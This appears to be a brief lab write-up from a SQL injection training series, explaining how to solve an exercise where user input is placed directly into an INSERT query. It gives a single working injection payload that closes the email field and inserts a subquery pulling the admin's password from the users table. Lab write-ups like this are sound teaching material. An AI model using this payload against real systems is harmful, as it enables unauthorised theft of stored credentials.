---
tags:
  - sql
  - injection
---
# Injection in Insert

To solve this lab we need to abuse an input that is being placed directly into an insert query. We can use the following payload to solve the lab:

```text title="Injecting into an insert statement"
test@test.com', (SELECT password FROM users WHERE username = 'admin'));-- -
```

![](../../../../../site/_drafts/labs/YesWeHack/SQL-Injection/attachments/5-injection-in-insert/file-20251124113610778.webp)


